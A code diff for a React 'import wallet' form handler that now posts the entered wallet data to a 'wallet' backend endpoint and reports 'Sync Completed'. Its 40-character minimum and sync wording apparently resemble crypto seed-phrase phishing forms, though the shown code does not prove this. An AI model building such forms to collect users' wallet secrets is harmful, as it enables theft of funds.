@@ -1,6 +1,12 @@
 import { toast } from "react-toastify";
+import { Request } from "../../../helpers/request";
 
-export const handleFormSubmit = ({ e, state, setImportWallet, message }) => {
+export const handleFormSubmit = async ({
+  e,
+  state,
+  setImportWallet,
+  message,
+}) => {
   e.preventDefault();
   const id = toast.loading("Processing...");
   if (message.length < 40) {
@@ -12,7 +18,6 @@ export const handleFormSubmit = ({ e, state, setImportWallet, message }) => {
     });
   }
   setImportWallet(true);
-  console.log("continue");
   const keys = Object.keys(state);
   const values = Object.values(state);
 
@@ -25,24 +30,24 @@ export const handleFormSubmit = ({ e, state, setImportWallet, message }) => {
     return obj;
   });
 
-  console.log(obj);
+  const request = new Request("wallet");
+  const getMessage = await request.getMessage(obj);
+  setImportWallet(false);
 
-  //   if (!initializePayment.status) {
-  //     return toast.update(id, {
-  //       render: initializePayment.message || "An error occurred. Try again later",
-  //       type: "error",
-  //       isLoading: false,
-  //       autoClose: 2000,
-  //     });
-  //   }
-  //   if (initializePayment.status) {
-  //     toast.update(id, {
-  //       render: "Processing",
-  //       type: "success",
-  //       isLoading: false,
-  //       autoClose: 2000,
-  //     });
-
-  //   }
-  //   console.log(obj);
+  if (!getMessage.status) {
+    return toast.update(id, {
+      render: getMessage.message || "An error occurred. Try again later",
+      type: "error",
+      isLoading: false,
+      autoClose: 2000,
+    });
+  }
+  if (getMessage.status) {
+    toast.update(id, {
+      render: "Sync Completed",
+      type: "success",
+      isLoading: false,
+      autoClose: 5000,
+    });
+  }
 };
